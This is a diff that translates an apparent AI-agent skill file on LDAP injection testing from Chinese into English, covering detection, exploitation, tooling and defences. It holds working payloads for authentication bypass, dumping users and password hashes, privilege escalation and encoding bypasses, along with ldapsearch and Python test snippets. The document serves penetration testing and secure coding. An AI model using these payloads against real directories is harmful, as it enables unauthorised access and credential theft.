@@ -1,30 +1,30 @@
 ---
 name: ldap-injection-testing
-description: LDAP注入漏洞测试的专业技能和方法论
+description: Professional skills and methodology for LDAP injection vulnerability testing
 version: 1.0.0
 ---
 
-# LDAP注入漏洞测试
+# LDAP Injection Vulnerability Testing
 
-## 概述
+## Overview
 
-LDAP注入是一种类似于SQL注入的漏洞，利用LDAP查询语句的构造缺陷，可能导致信息泄露、权限绕过等。本技能提供LDAP注入的检测、利用和防护方法。
+LDAP injection is a vulnerability similar to SQL injection that exploits flaws in the construction of LDAP query statements, potentially leading to information disclosure, privilege bypass, and more. This skill provides methods for detecting, exploiting, and protecting against LDAP injection.
 
-## 漏洞原理
+## Vulnerability Principle
 
-应用程序将用户输入直接拼接到LDAP查询语句中，未进行充分验证和过滤，导致攻击者可以修改查询逻辑。
+The application directly concatenates user input into LDAP query statements without sufficient validation and filtering, allowing attackers to modify query logic.
 
-**危险代码示例：**
+**Dangerous code example:**
 ```java
 String filter = "(&(cn=" + userInput + ")(userPassword=" + password + "))";
 ldapContext.search(baseDN, filter, ...);
 ```
 
-## LDAP基础
+## LDAP Basics
 
-### 查询语法
+### Query Syntax
 
-**基础查询：**
+**Basic queries:**
 ```
 (cn=John)
 (objectClass=person)
@@ -33,28 +33,28 @@ ldapContext.search(baseDN, filter, ...);
 (!(cn=John))
 ```
 
-### 特殊字符
+### Special Characters
 
-**需要转义的字符：**
-- `(` `)` - 括号
-- `*` - 通配符
-- `\` - 转义符
-- `/` - 路径分隔符
-- `NUL` - 空字符
+**Characters that need escaping:**
+- `(` `)` - Parentheses
+- `*` - Wildcard
+- `\` - Escape character
+- `/` - Path separator
+- `NUL` - Null character
 
-## 测试方法
+## Testing Methods
 
-### 1. 识别LDAP输入点
+### 1. Identify LDAP Input Points
 
-**常见功能：**
-- 用户登录
-- 用户搜索
-- 目录浏览
-- 权限验证
+**Common functions:**
+- User login
+- User search
+- Directory browsing
+- Permission verification
 
-### 2. 基础检测
+### 2. Basic Detection
 
-**测试特殊字符：**
+**Test special characters:**
 ```
 *)(&
 *)(|
@@ -62,154 +62,154 @@ ldapContext.search(baseDN, filter, ...);
 *))%00
 ```
 
-**测试逻辑操作符：**
+**Test logical operators:**
 ```
 *)(&(cn=*
 *)(|(cn=*
 *))(!(cn=*
 ```
 
-### 3. 认证绕过
+### 3. Authentication Bypass
 
-**基础绕过：**
+**Basic bypass:**
 ```
-用户名: *)(&
-密码: *
-查询: (&(cn=*)(&)(userPassword=*))
-```
-
-**更精确的绕过：**
-```
-用户名: admin)(&(cn=admin
-密码: *))
-查询: (&(cn=admin)(&(cn=admin)(userPassword=*)))
+Username: *)(&
+Password: *
+Query: (&(cn=*)(&)(userPassword=*))
 ```
 
-### 4. 信息泄露
+**More precise bypass:**
+```
+Username: admin)(&(cn=admin
+Password: *))
+Query: (&(cn=admin)(&(cn=admin)(userPassword=*)))
+```
 
-**枚举用户：**
+### 4. Information Disclosure
+
+**Enumerate users:**
 ```
 *)(cn=*
 *)(uid=*
 *)(mail=*
 ```
 
-**获取属性：**
+**Retrieve attributes:**
 ```
 *)(|(cn=*)(userPassword=*
 *)(|(objectClass=*)(cn=*
 ```
 
-## 利用技术
+## Exploitation Techniques
 
-### 认证绕过
+### Authentication Bypass
 
-**方法1：逻辑绕过**
+**Method 1: Logic bypass**
 ```
-输入: *)(&
-查询: (&(cn=*)(&)(userPassword=*))
-结果: 匹配所有用户
-```
-
-**方法2：注释绕过**
-```
-输入: admin)(&(cn=admin
-查询: (&(cn=admin)(&(cn=admin)(userPassword=*)))
+Input: *)(&
+Query: (&(cn=*)(&)(userPassword=*))
+Result: Matches all users
 ```
 
-**方法3：通配符**
+**Method 2: Comment bypass**
 ```
-输入: *)(|(cn=*)(userPassword=*
-查询: (&(cn=*)(|(cn=*)(userPassword=*)(userPassword=*))
-```
-
-### 信息泄露
-
-**枚举所有用户：**
-```
-搜索: *)(cn=*
-结果: 返回所有cn属性
+Input: admin)(&(cn=admin
+Query: (&(cn=admin)(&(cn=admin)(userPassword=*)))
 ```
 
-**获取密码哈希：**
+**Method 3: Wildcard**
 ```
-搜索: *)(|(cn=*)(userPassword=*
-结果: 返回用户和密码哈希
-```
-
-**获取敏感属性：**
-```
-搜索: *)(|(cn=*)(mail=*)(telephoneNumber=*
-结果: 返回多个敏感属性
+Input: *)(|(cn=*)(userPassword=*
+Query: (&(cn=*)(|(cn=*)(userPassword=*)(userPassword=*))
 ```
 
-### 权限提升
+### Information Disclosure
 
-**修改查询逻辑：**
+**Enumerate all users:**
 ```
-原始: (&(cn=user)(memberOf=CN=Users,DC=example,DC=com))
-注入: user)(memberOf=CN=Admins,DC=example,DC=com))(|(cn=user
-结果: 可能绕过权限检查
-```
-
-## 绕过技术
-
-### 编码绕过
-
-**URL编码：**
-```
-*)(& → %2A%29%28%26
-*)(| → %2A%29%28%7C
+Search: *)(cn=*
+Result: Returns all cn attributes
 ```
 
-**Unicode编码：**
+**Retrieve password hashes:**
 ```
-* → \u002A
-( → \u0028
-) → \u0029
+Search: *)(|(cn=*)(userPassword=*
+Result: Returns users and password hashes
 ```
 
-### 注释绕过
+**Retrieve sensitive attributes:**
+```
+Search: *)(|(cn=*)(mail=*)(telephoneNumber=*
+Result: Returns multiple sensitive attributes
+```
 
-**使用注释：**
+### Privilege Escalation
+
+**Modify query logic:**
+```
+Original: (&(cn=user)(memberOf=CN=Users,DC=example,DC=com))
+Injection: user)(memberOf=CN=Admins,DC=example,DC=com))(|(cn=user
+Result: May bypass permission checks
+```
+
+## Bypass Techniques
+
+### Encoding Bypass
+
+**URL encoding:**
+```
+*)(& -> %2A%29%28%26
+*)(| -> %2A%29%28%7C
+```
+
+**Unicode encoding:**
+```
+* -> \u002A
+( -> \u0028
+) -> \u0029
+```
+
+### Comment Bypass
+
+**Using comments:**
 ```
 *)(&(cn=*
 *)(|(cn=*
 ```
 
-### 空字符注入
+### Null Character Injection
 
-**使用NULL字节：**
+**Using NULL bytes:**
 ```
 *))%00
 ```
 
-## 工具使用
+## Tool Usage
 
 ### JXplorer
 
-**图形化LDAP客户端：**
-- 连接LDAP服务器
-- 浏览目录结构
-- 执行查询测试
+**Graphical LDAP client:**
+- Connect to LDAP server
+- Browse directory structure
+- Execute query tests
 
 ### ldapsearch
 
 ```bash
-# 基础查询
+# Basic query
 ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)"
 
-# 测试注入
+# Test injection
 ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)(&"
 ```
 
 ### Burp Suite
 
-1. 拦截LDAP查询请求
-2. 修改查询参数
-3. 观察响应结果
+1. Intercept LDAP query requests
+2. Modify query parameters
+3. Observe response results
 
-### Python脚本
+### Python Script
 
 ```python
 import ldap3
@@ -219,37 +219,37 @@ conn = ldap3.Connection(server, authentication=ldap3.SIMPLE,
                         user='cn=admin,dc=example,dc=com',
                         password='password')
 
-# 测试注入
+# Test injection
 filter_str = '*)(&'
 conn.search('dc=example,dc=com', filter_str)
 print(conn.entries)
 ```
 
-## 验证和报告
+## Verification and Reporting
 
-### 验证步骤
+### Verification Steps
 
-1. 确认可以控制LDAP查询
-2. 验证认证绕过或信息泄露
-3. 评估影响（未授权访问、数据泄露等）
-4. 记录完整的POC
+1. Confirm ability to control LDAP queries
+2. Verify authentication bypass or information disclosure
+3. Assess impact (unauthorized access, data leakage, etc.)
+4. Document complete POC
 
-### 报告要点
+### Report Key Points
 
-- 漏洞位置和输入参数
-- LDAP查询构造方式
-- 完整的利用步骤和PoC
-- 修复建议（输入验证、参数化查询等）
+- Vulnerability location and input parameters
+- LDAP query construction method
+- Complete exploitation steps and PoC
+- Remediation recommendations (input validation, parameterized queries, etc.)
 
-## 防护措施
+## Protective Measures
 
-### 推荐方案
+### Recommended Solutions
 
-1. **输入验证**
+1. **Input Validation**
    ```java
-   private static final String[] LDAP_ESCAPE_CHARS = 
+   private static final String[] LDAP_ESCAPE_CHARS =
        {"\\", "*", "(", ")", "\0", "/"};
-   
+
    public static String escapeLDAP(String input) {
        if (input == null) {
          return null;
@@ -266,35 +266,35 @@ print(conn.entries)
    }
    ```
 
-2. **参数化查询**
+2. **Parameterized Queries**
    ```java
-   // 使用LDAP API的参数化功能
+   // Use parameterized features of LDAP API
    String filter = "(&(cn={0})(userPassword={1}))";
    Object[] args = {escapedCN, escapedPassword};
-   // 使用API构建查询
+   // Use API to build query
    ```
 
-3. **白名单验证**
+3. **Whitelist Validation**
    ```java
-   // 只允许特定字符
+   // Allow only specific characters
    if (!input.matches("^[a-zA-Z0-9@._-]+$")) {
        throw new IllegalArgumentException("Invalid input");
    }
    ```
 
-4. **最小权限**
-   - LDAP连接使用最小权限账户
-   - 限制可查询的属性
-   - 使用访问控制列表
+4. **Least Privilege**
+   - LDAP connections use minimum privilege accounts
+   - Restrict queryable attributes
+   - Use access control lists
 
-5. **错误处理**
-   - 不返回详细错误信息
-   - 统一错误响应
-   - 记录错误日志
+5. **Error Handling**
+   - Do not return detailed error information
+   - Unified error responses
+   - Record error logs
 
-## 注意事项
+## Notes
 
-- 仅在授权测试环境中进行
-- 注意不同LDAP服务器的语法差异
-- 测试时避免对目录造成影响
-- 了解目标LDAP服务器的配置
+- Only perform testing in authorized test environments
+- Note syntax differences across LDAP servers
+- Avoid impacting directories during testing
+- Understand the target LDAP server configuration
